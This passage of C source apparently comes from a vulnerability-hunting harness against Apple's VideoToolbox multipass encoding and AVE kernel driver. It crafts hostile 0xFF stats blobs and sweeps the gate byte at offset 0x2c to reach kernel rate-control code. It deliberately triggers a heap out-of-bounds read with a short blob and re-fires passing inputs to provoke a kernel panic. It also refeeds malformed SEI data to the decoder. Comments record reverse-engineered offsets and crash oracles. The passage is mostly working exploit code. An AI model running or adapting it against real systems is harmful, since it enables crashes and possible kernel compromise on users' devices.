                dprintf(STDOUT_FILENO, "%s  I[%s] v98 UserQpMap {%d x %zuB} attached -> kernel -13 unlock probe\n",
                        pfx, tag, mapPat, mapLen);
                CFRelease(mdat);
            }
        }
    }
    int base = g_ave_cb_fires, baseOk = g_ave_cb_ok;
    g_ave_cb_err = 0; g_ave_cb_fire_mach = 0; g_ave_cb_bytes = 0;
    g_ave_fp_on = 1; g_ave_fp_len = 0;   /* v49: capture the output fingerprint for this cell */
    int es = -999;
    if (kind == DS_OPT_DPB_REQ_AFTER) es = 0;   /* v58: already prepared in the warm-up - a second Prepare could re-init state and drop the just-set DPBRequirements */
    /* v62: the DELIVERY-shot grind - the ACCEPTED keys get a multi-frame encode +
     * CompleteFrames drain to push the kernel alloc (the lookahead ring / GOP
     * ref-list) past its gate. val2 = the frame count for the grind kinds. */
    int nframes = 1;
    if (kind == DS_OPT_LA_GRIND || kind == DS_OPT_MKF_GRIND || kind == DS_OPT_LA_MKF)
        nframes = (val2 > 0 && val2 <= 32) ? (int)val2 : 1;
    else if (kind == DS_OPT_PUB_GRIND)
        nframes = 8;   /* v64: the accepted-key grinds - a fixed 8-frame drain (val2 = the key index, not a count) */
    else if (kind == DS_OPT_DATARATE)
        nframes = 4;   /* v65: the DataRateLimits overflow shape gets a drain (val2 = the seconds element) */
    else if (kind == DS_OPT_PPS_ARR)
        nframes = 2;   /* v66: the PPS-count cells get a light drain (val2 = the element count, not frames) */
    else if (kind == DS_OPT_USAGE_GRIND)
        nframes = 8;   /* v67: the usage-compound grind - a fixed 8-frame drain (val2 = the usage, not frames) */
    else if (kind == DS_OPT_PUB_GRIND24)
        nframes = 24;  /* v68: the StrictKFI=INTMAX deep drain - the MaxKeyFrameInterval-v62 escalation */
    else if (kind == DS_OPT_USAGE_GRIND24)
        nframes = 24;  /* v68: the EWP+usage-1 deep drain - the -1015 USL-process fault grind */
    else if (kind == DS_OPT_PPS_GRIND)
        nframes = 8;   /* v68: the PPS count-9 legal-edge grind - the forced-to-1 double-fire path */
    else if (kind == DS_OPT_TB_GRIND)
        nframes = (val2 > 0 && val2 <= 32) ? (int)val2 : 8;   /* v78: the TB-emitter grind - val2 = the frame count (the per-frame 512B trailing copy) */
    else if (kind == DS_OPT_PPS_HEVC && (val2 & (0x40000000 | 0x80000000)))
        nframes = 6;   /* v98/v100: the x6 GRIND - also for MultiPass cells so the PTS 0..5 hostile blob fill gets 6 consuming frames (val2 = the arm bits) */
    /* v102: MULTIPASS hostile stats (0x80000000) / SHORT-BLOB OOB read (0x1000) -
     * guard-wrapped. sizeof(S_AVE_MultiPassStats) = 1574 (plugin cmp 0x626; NO
     * 17314 constant exists in __TEXT - the v101 17314B blob was size-gated out:
     * 'FIG: CFDataGetLength(data) = 17314 != sizeof(...) 1574' in the DAEMON log).
     * The per-frame fetch (AVE_Session_AVC_Process -> AVE_H264MultipassDataFetch)
     * runs for frames >= 1 at storage index frameNumber-1; the mode!=1 path gates
     * size==1574 + data[0x2c]==session frame counter (the REAL frameNumber field
     * is at blob offset 0x2c), the mode==1 path memcpys 1574 bytes with NO length
     * check = OPB0's 256B blob = the heap OOB read. Blobs: 1574B 0xFF stats with
     * [0:4]=f and [0x2c]=f+1 (blob f serves frame f+1). Daemon FIG oracles:
     * 'CFDataGetLength(data) = X != sizeof(S_AVE_MultiPassStats) Y' + 'AVE_H264
     * MultipassDataFetch failed' (the [0x2c] frameNumber gate) + 'AVE_BeginPass
     * called with multiPassStorage = NULL' (the attach check). */
    /* v104 OPC0: THE SID GATE SWEEP (bit 0x200). The plugin fetch gates the stats
     * on blob[0x2c] vs the session field at sess+0xce4 - the v102 reviewer's
     * client-ID hypothesis (0xce4 also feeds SEI SetSessionIDEx). The 22:26/22:46
     * wedges prove SOME [0x2c] value passes (a reject = fast FIG, no wedge; an
     * accept = the 9s encode-RPC wedge = the stats CONSUMED = the kernel RC shot).
     * Sweep candidate IDs on fresh mini-sessions (create+storage+BeginPass+1
     * frame+EndPass, all guarded): a sub-run returning EndPass further=1 or
     * wedging 9s = THE GATE-PASS ID. Then RE-FIRE it x3 (the kernel push - watch
     * the AVE heartbeat for a gap = kernel stuck; a fault there = the PANIC). Each
     * sub-run creates a session + storage + 1.5KB backing; on a guard fault they
     * leak (bounded - the established convention; max ~11 sessions worst case). */
    if (kind == DS_OPT_PPS_HEVC && (val2 & 0x200)) {
        /* v105 OPC0: FULL [0x2c] BYTE SWEEP 0..255 + 2-FRAME SESSIONS.
         * AVE_H264MultipassDataFetch (0x2b94133a0) decoded:
         *   - the gate: blob[0x2c] (the fetched stats frameNumber field, 32-bit load
         *     ldr w8 [x22,#0x2c]) is compared to the session's current frameNumber
         *     [x19+0xce4] (the FIG 'saMultiPassInputSiloData[0].frameNumber !=
         *     frameNumber'); the fetch KEY is [x19+0xd2c]-1 = frameNumber-1.
         *   - a 1-frame mini-session encodes frame 0 only -> the fetch key is -1 ->
         *     the fetch NEVER fires -> the v104 fast EndPass rejects were NO-FETCH
         *     (the v104 'SID' sweep measured nothing but a storage-walk crash field).
         *   - v104 run evidence: blob[0x2c] values 4/8/10 FAULTED the CLIENT
         *     (sig=11/4/11, guard-caught, t=1-7ms) = a NEW deterministic client OOB
         *     in the storage walk (the 22:26:33 VTMultiPassStorageInvalidate
         *     overflow class) - the full sweep below maps the complete fault set.
         *   - v105: TWO frames (PTS 0 + PTS 1) so frame 1's fetch fires with key 0
         *     and hits the entry we stored at PTS 0. The pass oracle: EndPass
         *     further=1 = the stats were CONSUMED (frameNumber matched) = the hostile
         *     0xFF stats reach the plugin RC math and the kext config marshal = THE
         *     KERNEL SHOT; a 9s WEDGE on a 2-frame session = the fetch round-trip
         *     fired (delivery proof at mini size); a fast reject = fetch ran but the
         *     frameNumber compare failed (try the next value).
         * Each sub-run: session + storage + 1.5KB blob + 2 frames, all guarded; on a
         * guard fault the sub-run's objects leak (bounded, the established convention). */
        int passSid = -1, wedgedSid = -1;
        int faultSet[256]; int nFault = 0;
        int nShot = 0, nReject = 0, nWedge = 0, nTimeout = 0;
        for (int sid = 0; sid < 256 && nShot < 256 && nWedge < 1; sid++) {
            int sig = 0, es = -999;
            __block int beg1 = -999, end1 = -999, further1 = 0;
            __block VTCompressionSessionRef csOut = NULL;   /* v106: teardown deferred OUT of the guard (poison-aware) */
            int base = g_ave_cb_fires, baseOk = g_ave_cb_ok;
            uint64_t t0 = mach_absolute_time();
            if (g_opt_conn_poisoned) {
                dprintf(STDOUT_FILENO, "%s  I[%s] SWEEP-SKIPPED (v107 conn-poisoned - the wedge cells already killed the connection)\n", pfx, tag);
                nShot = 256;
                break;
            }
            /* v108: per-shot journal - the 00:37 stack smash (asi 'stack buffer
             * overflow', pc=0, CODESIGNING SIGKILL) is UNCATCHABLE and no receipt can
             * print after it; the journal START-without-DONE names the exact byte. */
            {
                char stag[40];
                snprintf(stag, sizeof(stag), "OPC0 x%02x", sid);
                ds_journal_write("START", stag);
            }
            sig = ds_ave_guard_run_tmo(^int {
                VTCompressionSessionRef cs = NULL;
                OSStatus csSt = VTCompressionSessionCreate(NULL, 64, 64, kCMVideoCodecType_H264,
                                                           NULL, NULL, NULL, ave_out_cb, NULL, &cs);
                if (csSt != 0 || !cs) return (int)csSt;
                VTMultiPassStorageRef mpStorage = NULL;
                int r = (int)VTMultiPassStorageCreate(kCFAllocatorDefault, NULL,
                                                      kCMTimeRangeInvalid, NULL, &mpStorage);
                if (r == 0 && mpStorage) {
                    uint8_t *mpBuf = malloc(1574);   /* v108-r: hostile blob on the HEAP - the smash is Apple code, not ours */
                    if (mpBuf) {
                        memset(mpBuf, 0xFF, 1574);
                        *(int32_t *)mpBuf = 0;            /* silo[0].frameNumber (this entry serves frame 1) */
                        *(int32_t *)(mpBuf + 0x2c) = sid; /* the frameNumber gate field - FULL SWEEP */
                        CFDataRef mpData = CFDataCreate(kCFAllocatorDefault, mpBuf, 1574);
                        if (mpData) {
                            CMTime pts = CMTimeMake(0, 600);  /* entry at PTS 0 = frame 1's fetch key (fn-1) */
                            (void)VTMultiPassStorageSetDataAtTimeStamp(mpStorage, &pts, mpData, NULL);
                            CFRelease(mpData);
                        }
                        free(mpBuf);
                    }
                    r = (int)VTSessionSetProperty(cs, kVTCompressionPropertyKey_MultiPassStorage, mpStorage);
                }
                if (mpStorage) CFRelease(mpStorage);
                size_t bpr = 64 * 4, len = bpr * 64;
                uint8_t *backing = malloc(len);
                if (!backing) { VTCompressionSessionInvalidate(cs); CFRelease(cs); return -9999; }
                memset(backing, 0x41, len);
                CVPixelBufferRef pb2 = NULL;
                CVReturn cr = CVPixelBufferCreateWithBytes(NULL, 64, 64, kCVPixelFormatType_32BGRA,
                                                           backing, bpr, NULL, NULL, NULL, &pb2);
                if (cr != 0 || !pb2) { free(backing); VTCompressionSessionInvalidate(cs); CFRelease(cs); return (int)cr; }
                OSStatus b = VTCompressionSessionPrepareToEncodeFrames(cs);
                if (b == 0) { beg1 = (int)VTCompressionSessionBeginPass(cs, 0, NULL); b = beg1; }
                if (b == 0) b = VTCompressionSessionEncodeFrame(cs, pb2, CMTimeMake(0, 600), CMTimeMake(1, 600), NULL, NULL, NULL);
                if (b == 0) b = VTCompressionSessionEncodeFrame(cs, pb2, CMTimeMake(1, 600), CMTimeMake(1, 600), NULL, NULL, NULL); /* frame 1 -> fetch key 0 */
                Boolean further = false;
                if (b == 0) { end1 = (int)VTCompressionSessionEndPass(cs, &further, NULL); further1 = further ? 1 : 0; b = end1; }
                CVBufferRelease(pb2);
                free(backing);
                csOut = cs;   /* v106: teardown deferred - decided after the wedge oracle */
                return (int)b;
            }, &es, 10000);
            double tMs = ds_ave_elapsed_ms(t0);
            int fires = g_ave_cb_fires - base, okf = g_ave_cb_ok - baseOk;
            nShot++;
            if (sig == SIGALRM) {
                /* v107: the watchdog fired - this shot HUNG on a conn that looked alive
                 * (the 00:19 OPA0-create class: mach_msg inside the guard, no signal,
                 * then the death-callback pc=0 wild-jump = CODESIGNING SIGKILL). The
                 * conn is dead - stop the sweep, never create on it again. */
                if (wedgedSid < 0) wedgedSid = sid;
                nWedge++; nTimeout++;
                g_opt_conn_poisoned = 1;
                dprintf(STDOUT_FILENO, "%s  I[%s] X=0x%02x TIMEOUT (v107 watchdog 10s) = CONN DEAD - SWEEP STOPPED (the hang class of the 00:19 SIGKILL)\n", pfx, tag, sid);
                if (csOut) ds_opt_teardown(pfx, tag, csOut);
                nShot = 256;
                break;
            }
            if (sig > 0) {
                /* v107 note: the CLIENT-FAULT (non-ALRM) path deliberately does NOT
                 * poison - the 4/8/10 OOB map is the sweep's payload; only a TIMEOUT
                 * (hang) means the conn died. Do not "fix" this into stopping. */
                if (nFault < 256) faultSet[nFault++] = sid;
                dprintf(STDOUT_FILENO, "%s  I[%s] X=0x%02x sig=%d beg=%d end=%d further=%d cb=%d ok=%d t=%.0fms CLIENT-FAULT (*** OOB oracle ***)\n",
                        pfx, tag, sid, sig, beg1, end1, further1, fires, okf, tMs);
            } else if (further1 == 1) {
                passSid = sid;
                dprintf(STDOUT_FILENO, "%s  I[%s] X=0x%02x further=1 end=%d *** GATE-PASS = STATS CONSUMED (the kernel RC shot) ***\n",
                        pfx, tag, sid, end1);
            } else if (tMs > 8000.0) {
                /* v106: wedge #1 = the FigRPC connection is DEAD (the 23:19/23:52
                 * evidence: 9s RPC hang -> AVE_ClientDie / kernel -1015 reset reject
                 * -> the NEXT Invalidate on the poisoned connection blocks and the
                 * death-callback wild-jumps = the 23:52 SIGKILL). STOP the sweep -
                 * continuing would create+invalidate sessions on a dead connection.
                 * The wedge itself is the delivery oracle (fetch fired). */
                if (wedgedSid < 0) wedgedSid = sid;
                nWedge++;
                g_opt_conn_poisoned = 1;
                dprintf(STDOUT_FILENO, "%s  I[%s] X=0x%02x t=%.0fms WEDGE #1 = CONN DEAD - SWEEP STOPPED (v107 poison; the fetch FIRED = delivery, wedge!=pass)\n",
                        pfx, tag, sid, tMs);
                if (csOut) ds_opt_teardown(pfx, tag, csOut);   /* v106: the wedging shot's session - leaked with the TEARDOWN-SKIPPED receipt */
                nShot = 256;
                break;
            } else {
                nReject++;
            }
            {
                char stag[40];
                snprintf(stag, sizeof(stag), "OPC0 x%02x", sid);
                ds_journal_write("DONE", stag);   /* v108: no DONE after a TIMEOUT/WEDGE/SIGKILL = the shot that killed it */
            }
            if (csOut) ds_opt_teardown(pfx, tag, csOut);   /* v106: poison-aware - leaks if the conn died */
            if (passSid >= 0) break;              /* found a real consumption - stop the sweep */
        }
        dprintf(STDOUT_FILENO, "%s  I[%s] SWEEP done: %d shot(s) reject=%d fault=%d wedge=%d TIMEOUT=%d pass=%d - further=1 = the kernel shot; wedge/TIMEOUT = delivery only\n",
                pfx, tag, nShot, nReject, nFault, nWedge, nTimeout, passSid);
        if (nFault > 1)
            dprintf(STDOUT_FILENO, "%s  I[%s] fault set: %d value(s) {0x%02x, 0x%02x, 0x%02x, ...} (the client storage-walk OOB map - compare to the 22:26:33 overflow)\n",
                    pfx, tag, nFault, faultSet[0], nFault > 1 ? faultSet[1] : 0, nFault > 2 ? faultSet[2] : 0);
        if (passSid >= 0) {
            dprintf(STDOUT_FILENO, "%s  I[%s] RE-FIRE pass X=0x%02x x3 - grind the kernel RC with the 0xFF stats (MAY PANIC)\n", pfx, tag, passSid);
            for (int rf = 0; rf < 3; rf++) {
                int sig2 = 0, es2 = -999;
                __block int beg2 = -999, end2 = -999, further2 = 0;
                __block VTCompressionSessionRef csOut2 = NULL;   /* v106: teardown deferred (poison-aware) */
                uint64_t t1 = mach_absolute_time();
                if (g_opt_conn_poisoned) { dprintf(STDOUT_FILENO, "%s  I[%s] RF%d SKIPPED (v107 conn-poisoned)\n", pfx, tag, rf + 1); break; }
                sig2 = ds_ave_guard_run_tmo(^int {
                    VTCompressionSessionRef cs = NULL;
                    OSStatus csSt = VTCompressionSessionCreate(NULL, 64, 64, kCMVideoCodecType_H264,
                                                               NULL, NULL, NULL, ave_out_cb, NULL, &cs);
                    if (csSt != 0 || !cs) return (int)csSt;
                    VTMultiPassStorageRef mpStorage = NULL;
                    int r = (int)VTMultiPassStorageCreate(kCFAllocatorDefault, NULL,
                                                          kCMTimeRangeInvalid, NULL, &mpStorage);
                    if (r == 0 && mpStorage) {
                        uint8_t *mpBuf = malloc(1574);   /* v108-r: heap blob (refire) */
                        if (mpBuf) {
                            memset(mpBuf, 0xFF, 1574);
                            *(int32_t *)mpBuf = 0;
                            *(int32_t *)(mpBuf + 0x2c) = passSid;
                            CFDataRef mpData = CFDataCreate(kCFAllocatorDefault, mpBuf, 1574);
                            if (mpData) {
                                CMTime pts = CMTimeMake(0, 600);
                                (void)VTMultiPassStorageSetDataAtTimeStamp(mpStorage, &pts, mpData, NULL);
                                CFRelease(mpData);
                            }
                            free(mpBuf);
                        }
                        r = (int)VTSessionSetProperty(cs, kVTCompressionPropertyKey_MultiPassStorage, mpStorage);
                    }
                    if (mpStorage) CFRelease(mpStorage);
                    size_t bpr = 64 * 4, len = bpr * 64;
                    uint8_t *backing = malloc(len);
                    if (!backing) { VTCompressionSessionInvalidate(cs); CFRelease(cs); return -9999; }
                    memset(backing, 0x41, len);
                    CVPixelBufferRef pb2 = NULL;
                    CVReturn cr = CVPixelBufferCreateWithBytes(NULL, 64, 64, kCVPixelFormatType_32BGRA,
                                                               backing, bpr, NULL, NULL, NULL, &pb2);
                    if (cr != 0 || !pb2) { free(backing); VTCompressionSessionInvalidate(cs); CFRelease(cs); return (int)cr; }
                    OSStatus b = VTCompressionSessionPrepareToEncodeFrames(cs);
                    if (b == 0) { beg2 = (int)VTCompressionSessionBeginPass(cs, 0, NULL); b = beg2; }
                    if (b == 0) b = VTCompressionSessionEncodeFrame(cs, pb2, CMTimeMake(0, 600), CMTimeMake(1, 600), NULL, NULL, NULL);
                    if (b == 0) b = VTCompressionSessionEncodeFrame(cs, pb2, CMTimeMake(1, 600), CMTimeMake(1, 600), NULL, NULL, NULL);
                    Boolean further = false;
                    if (b == 0) { end2 = (int)VTCompressionSessionEndPass(cs, &further, NULL); further2 = further ? 1 : 0; b = end2; }
                    CVBufferRelease(pb2);
                    free(backing);
                    csOut2 = cs;   /* v106: teardown deferred */
                    return (int)b;
                }, &es2, 10000);
                double t2 = ds_ave_elapsed_ms(t1);
                if (sig2 == SIGALRM) g_opt_conn_poisoned = 1;   /* v107: watchdog = the conn hung = dead */
                if (t2 > 8000.0 && sig2 == 0) g_opt_conn_poisoned = 1;   /* v106: a wedging re-fire = conn dead */
                if (csOut2) ds_opt_teardown(pfx, tag, csOut2);

                dprintf(STDOUT_FILENO, "%s  I[%s] RF%d X=0x%02x sig=%d end=%d further=%d t=%.0fms %s\n",
                        pfx, tag, rf + 1, passSid, sig2, end2, further2, t2,
                        (sig2 == SIGALRM) ? "TIMEOUT" : ((further2 == 1) ? "GATE-PASS" : (t2 > 8000.0 ? "WEDGE(9s)" : "reject")));
            }
        }
        goto mp_sweep_done;
    }
    /* v103 OPB0: VT-MULTIPASS TEARDOWN OOB SWEEP (client-only, bit 0x100) - the
     * 22:26:31/33 evidence: the daemon RPC wedge (9s, msgh_id 18313) + the CLIENT
     * stack-buffer-overflow SIGABRT in VTMultiPassStorageInvalidate (__stack_chk_
     * fail, asi 'stack buffer overflow') during teardown of the 6 pre-populated
     * 1574B stats. SW01 = storage-only entry-count sweep (VTMultiPassStorageClose
     * = the same teardown walk) = the THRESHOLD ORACLE; SW02 = the exact crash
     * shape (6 entries attached to a live session, then session Invalidate). */
    if (kind == DS_OPT_PPS_HEVC && (val2 & 0x100)) {
        int swFaults = 0, swShots = 0;
        for (int n = 1; n <= 14 && swFaults == 0; n++) {
            int sg = 0, se = -999;
            sg = ds_ave_guard_run(^int {
                VTMultiPassStorageRef st = NULL;
                OSStatus cs = VTMultiPassStorageCreate(kCFAllocatorDefault, NULL, kCMTimeRangeInvalid, NULL, &st);
                if (cs != 0 || !st) return (int)cs;
                uint8_t buf[1574];
                for (int i = 0; i < n; i++) {
                    memset(buf, 0xFF, sizeof(buf));
                    *(int32_t *)buf = i;
                    *(int32_t *)(buf + 0x2c) = i + 1;
                    CFDataRef d = CFDataCreate(kCFAllocatorDefault, buf, sizeof(buf));
                    if (d) {
                        CMTime pts = CMTimeMake(i, 600);
                        (void)VTMultiPassStorageSetDataAtTimeStamp(st, &pts, d, NULL);
                        CFRelease(d);
                    }
                }
                OSStatus cl = VTMultiPassStorageClose(st);
                return (int)cl;
            }, &se);
            swShots++;
            if (sg) {
                swFaults++;
                dprintf(STDOUT_FILENO, "%s  I[%s] SW01 n=%2d -> FAULTED sig=%d @0x%lx (*** THRESHOLD ORACLE ***)\n", pfx, tag, n, sg, (unsigned long)g_ave_fault_addr);
            } else {
                dprintf(STDOUT_FILENO, "%s  I[%s] SW01 n=%2d -> clean (close=%d)\n", pfx, tag, n, se);
            }
        }
        {
            int sg2 = 0, se2 = -999;
            sg2 = ds_ave_guard_run(^int {
                VTCompressionSessionRef s2 = sess;   /* sess is not __block - read-only capture */
                VTMultiPassStorageRef st = NULL;
                OSStatus cs = VTMultiPassStorageCreate(kCFAllocatorDefault, NULL, kCMTimeRangeInvalid, NULL, &st);
                if (cs != 0 || !st) return (int)cs;
                uint8_t buf[1574];
                for (int i = 0; i < 6; i++) {
                    memset(buf, 0xFF, sizeof(buf));
                    *(int32_t *)buf = i;
                    *(int32_t *)(buf + 0x2c) = i + 1;
                    CFDataRef d = CFDataCreate(kCFAllocatorDefault, buf, sizeof(buf));
                    if (d) {
                        CMTime pts = CMTimeMake(i, 600);
                        (void)VTMultiPassStorageSetDataAtTimeStamp(st, &pts, d, NULL);
                        CFRelease(d);
                    }
                }
                (void)VTSessionSetProperty(s2, kVTCompressionPropertyKey_MultiPassStorage, st);
                VTCompressionSessionInvalidate(s2);
                CFRelease(s2);
                if (st) CFRelease(st);
                return 0;
            }, &se2);
            sess = NULL;   /* SW02 consumed the session; a fault here = bounded leak, guard caught */
            swShots++;
            if (sg2)
                dprintf(STDOUT_FILENO, "%s  I[%s] SW02 crash-shape (6 entries + session Invalidate) -> FAULTED sig=%d @0x%lx (*** THE 22:26:33 REPRO ***)\n", pfx, tag, sg2, (unsigned long)g_ave_fault_addr);
            else
                dprintf(STDOUT_FILENO, "%s  I[%s] SW02 crash-shape (6 entries + session Invalidate) -> clean (teardown=%d - the overflow needs the wedge/connection-death context)\n", pfx, tag, se2);
        }
        dprintf(STDOUT_FILENO, "%s  I[%s] SWEEP done: %d shot(s), %d fault(s) - the storage ops marshal over XPC to videocodecd (a daemon .ips during OPB0 = the overflow lands daemon-side too)\n", pfx, tag, swShots, swFaults);
        goto mp_sweep_done;
    }
    if (kind == DS_OPT_PPS_HEVC && (val2 & (0x80000000 | 0x1000))) {
        int mpSig = 0, mpEs = 0;
        __block int mpCreateSt = -999, mpSetN = 0, mpSetSt0 = -999, mpPropSt = -999;
        mpSig = ds_ave_guard_run(^int {
            VTMultiPassStorageRef mpStorage = NULL;
            size_t mpLen = (val2 & 0x1000) ? 256 : 1574;   /* OPB0 = 256B SHORT blob = the mode-1 unchecked-memcpy(1574) OOB read */
            uint8_t *mpBuf = malloc(1574);                  /* v108-r: heap blob (main MP cell) - sizeof(S_AVE_MultiPassStats) = 1574 (cmp 0x626) */
            if (!mpBuf) return -9999;
            OSStatus mpSt = VTMultiPassStorageCreate(kCFAllocatorDefault, NULL,
                kCMTimeRangeInvalid, NULL, &mpStorage);
            mpCreateSt = (int)mpSt;
            if (mpSt == 0 && mpStorage) {
                for (int f = 0; f < nframes; f++) {         /* nframes = 6 for MP cells (0x80000000|0x40000000); the fetch reads index frameNumber-1 for frames 1..5 */
                    memset(mpBuf, 0xFF, sizeof(mpBuf));
                    *(int32_t *)mpBuf = f;                  /* record field [0:4] */
                    *(int32_t *)(mpBuf + 0x2c) = f + 1;     /* the REAL gate: data[0x2c] == session frame counter (blob f serves frame f+1) */
                    CFDataRef mpData = CFDataCreate(kCFAllocatorDefault, mpBuf, mpLen);
                    if (mpData) {
                        CMTime pts = CMTimeMake(f, 600);
                        OSStatus setSt = VTMultiPassStorageSetDataAtTimeStamp(mpStorage, &pts, mpData, NULL);
                        if (mpSetN == 0) mpSetSt0 = (int)setSt;
                        mpSetN++;
                        CFRelease(mpData);
                    }
                }
                mpPropSt = (int)VTSessionSetProperty(sess, kVTCompressionPropertyKey_MultiPassStorage, mpStorage);
            }
            if (mpStorage) CFRelease(mpStorage);
            free(mpBuf);   /* v108-r: heap blob cleanup (leaks on guard fault - bounded 1.6KB) */
            return 0;
        }, &mpEs);
        /* bounded-leak note: on a guard fault siglongjmp skips the cleanup - the
         * in-flight mpStorage/mpData leak (max 2 cells x 1.6KB, accepted). */
        if (mpSig) dprintf(STDOUT_FILENO, "%s  I[%s] MP prep FAULTED sig=%d @0x%lx (guarded)\n", pfx, tag, mpSig, (unsigned long)g_ave_fault_addr);
        else dprintf(STDOUT_FILENO, "%s  I[%s] MP prep: create=%d sets=%d setSt0=%d prop=%d (v104 quiet)\n", pfx, tag, mpCreateSt, mpSetN, mpSetSt0, mpPropSt);
    }

    int fr = ds_ave_guard_run(^int {
        if (kind != DS_OPT_DPB_REQ_AFTER) {
            OSStatus a = VTCompressionSessionPrepareToEncodeFrames(sess);
            if (a != 0) return (int)a;
        }
        OSStatus b = 0;
        if (kind == DS_OPT_PPS_HEVC && (val2 & (0x80000000 | 0x1000))) {
            /* v102: the proper two-pass cycle. The plugin AVE_BeginPass validates the
             * storage attach ('multiPassStorage = NULL' FIG = the v101 silent-skip
             * suspect CONFIRMED = the session prop never landed daemon-side) and arms
             * the per-frame stats fetch. */
            b = VTCompressionSessionBeginPass(sess, 0, NULL);
            mpB1 = (int)b;
            if (b != 0) return (int)b;
        }
        for (int f = 0; f < nframes; f++)
            b = VTCompressionSessionEncodeFrame(sess, pb, CMTimeMake(f, 600), CMTimeMake(1, 600),
                                                fp, NULL, NULL);
        if (kind == DS_OPT_PPS_HEVC && (val2 & (0x80000000 | 0x1000))) {
            Boolean further = false;
            b = VTCompressionSessionEndPass(sess, &further, NULL);
            mpE1 = (int)b; mpF1 = further ? 1 : 0;
            if (b == 0 && further) {
                /* v102: pass 2 = FINAL - identical frames, the stats re-consumed */
                b = VTCompressionSessionBeginPass(sess, kVTCompressionSessionBeginFinalPass, NULL);
                mpB2 = (int)b;
                for (int f = 0; f < nframes && b == 0; f++)
                    b = VTCompressionSessionEncodeFrame(sess, pb, CMTimeMake(f, 600), CMTimeMake(1, 600), fp, NULL, NULL);
                if (b == 0) { b = VTCompressionSessionEndPass(sess, &further, NULL); mpE2 = (int)b; }
            }
        }
        return (int)b;
    }, &es);
    if (kind == DS_OPT_PPS_HEVC && (val2 & (0x80000000 | 0x1000)))
        dprintf(STDOUT_FILENO, "%s  I[%s] MP 2PASS: B1=%d E1=%d further=%d B2=%d E2=%d (v104 quiet - further=1 = stats CONSUMED)\n", pfx, tag, mpB1, mpE1, mpF1, mpB2, mpE2);
    int flushed = 0, drainFr = 0;
    if (fr == 0) {
        if (kind == DS_OPT_PPS_HEVC) {
            /* v86 SPEED: skip the CompleteFrames drain on the UPS wedge cells -
             * the v85 run PROVED it blocks ~240s client-side (the daemon's USL
             * 120s timeout chain: 'AVE_USL_Drv_Complete status.counter (0) !=
             * counter (2/3/4)' escalation -> RPC-kill; the cb arrives via XPC
             * DURING the block so the 30s wait loop never governs). The UPS
             * count rides at Prepare/EncodeFrame (the daemon logs 'FIG:
             * i32PPSsCount (19)... Forcing i32PPSsCount to 1' right after
             * Prepare Enter) and the kext dump-loop OOB fires at the session-
             * config marshal - the drain adds NOTHING but 4 min. Wait up to 30s
             * for the cb (a bypass-success cell encodes in ~300ms = ok=1); no
             * cb = wedge absorbed client-side (judge the daemon log); the
             * session is Invalidated in the cleanup tail. */
            dprintf(STDOUT_FILENO, "%s  I[%s] drain SKIPPED (v89 wedge-fast 10s - the daemon log is the oracle; ok=1 within 10s = THE PASS, no cb = wedge absorbed client-side)\n", pfx, tag);
            flushed = 1;
        } else {
            int es2 = -999;
            drainFr = ds_ave_guard_run(^int { return (int)VTCompressionSessionCompleteFrames(sess, kCMTimeInvalid); }, &es2);
            flushed = 1;
        }
    }
    int fires = 0, okf = 0;
    if (es == 0 && fr == 0 && drainFr == 0) {
        int waitCap = (kind == DS_OPT_PPS_HEVC) ? 15 : 40;  /* v92: UPS cells bail at 3s (bypass cb ~300ms; gated = wedge, no cb) - the v91 10s per wedge cell was the slow path */
        for (int i = 0; i < waitCap; i++) {
            usleep(200000);
            fires = g_ave_cb_fires - base;
            okf = g_ave_cb_ok - baseOk;
            if (fires > 0) break;
        }
    } else {
        fires = g_ave_cb_fires - base;
        okf = g_ave_cb_ok - baseOk;
    }
    double tMs = ds_ave_elapsed_ms(t0);
    if (tMs > 8000.0 && kind != DS_OPT_NONE && kind != DS_OPT_PPS_ARR) {
        g_opt_conn_poisoned = 1;   /* v106: a 9s+ cell = the FigRPC wedge - the connection is dead, the tail teardown must LEAK */
        dprintf(STDOUT_FILENO, "%s  I[%s] t=%.0fms WEDGE-SIGNATURE (v107: conn poisoned - tail teardown will LEAK, no Invalidate)\n", pfx, tag, tMs);
    }
    if (fr > 0 || drainFr > 0) {
        dprintf(STDOUT_FILENO, "%s  I[%s] FAULTED in-process at 0x%llx (sig %d)\n", pfx, tag,
                (unsigned long long)g_ave_fault_addr, fr > 0 ? fr : drainFr);
    } else {
        const char *verdict;
        if (okf > 0)       verdict = "ok=1 ACCEPT - frame to the AVE kernel path";
        else if (fires > 0) verdict = "ok=0 REJECT - cb returned an error";
        else               verdict = "ok=0 NO cb - frame dropped/held";
        ds_ave_stamp(st0, sizeof(st0));
        char fpH[48];
        ds_fp_hex(fpH, sizeof(fpH));
        dprintf(STDOUT_FILENO, "%s [%s] I[%s] Prep+Encode=%d flushed=%d cb fires=%d (ok=%d) err=%d fp=%s t=%.0fms => %s\n",
                pfx, st0, tag, es, flushed, fires, okf, (int)g_ave_cb_err, fpH, tMs, verdict);
    }
    /* v77: SEI-REFEED SELF-DECODE - the captured full ok sample (g_ave_cap_sb) is the
     * actual encoded HEVC output carrying OUR hostile SEI bytes (v76 fp PROOF
     * 5a5a5a5a). Feed it BACK into a VTDecompressionSession: the daemon's DECODER
     * (the still-undissected half) parses our truncated ST2094-40 SEI (AVE 8B vs
     * the 24B spec / CLL 4B vs 16B / MDCV 24B vs the kext's fixed reads) = a NEW
     * crash class on the decode side. */
    if (kind == DS_OPT_SEI_REFEED) {
        if (g_opt_conn_poisoned) {
            dprintf(STDOUT_FILENO, "%s  I[%s] REFEED-SKIPPED (v107 conn-poisoned - the decode side rides the same FigRPC conn, a refeed would risk the SIGKILL)\n", pfx, tag);
        } else if (g_ave_cap_sb) {
            CMFormatDescriptionRef rfd = CMSampleBufferGetFormatDescription(g_ave_cap_sb);
            VTDecompressionSessionRef dsess = NULL;
            VTDecompressionOutputCallbackRecord dcb = { dec_out_cb, NULL };
            OSStatus dst = -1;
            if (rfd) dst = VTDecompressionSessionCreate(NULL, rfd, NULL, NULL, &dcb, &dsess);
            if (dst != 0 || !dsess) {
                dprintf(STDOUT_FILENO, "%s  I[%s] REFEED dec-create=%d (decoder refused the captured sample - client-side gate)\n", pfx, tag, (int)dst);
            } else {
                g_dec_cb_fires = 0; g_dec_cb_ok = 0; g_dec_cb_err = 0; g_dec_out_w = g_dec_out_h = 0;
                uint64_t rt0 = mach_absolute_time();
                int res = -999;
                long rl = (g_refeed_loops > 0 && g_refeed_loops <= 64) ? g_refeed_loops : 1;   /* v79: the compound-hammer loop count (bit 9) */
                int prevF = -1;
                for (long ri = 0; ri < rl; ri++) {
                    int r1 = -999;
                    (void)ds_ave_guard_run(^int {
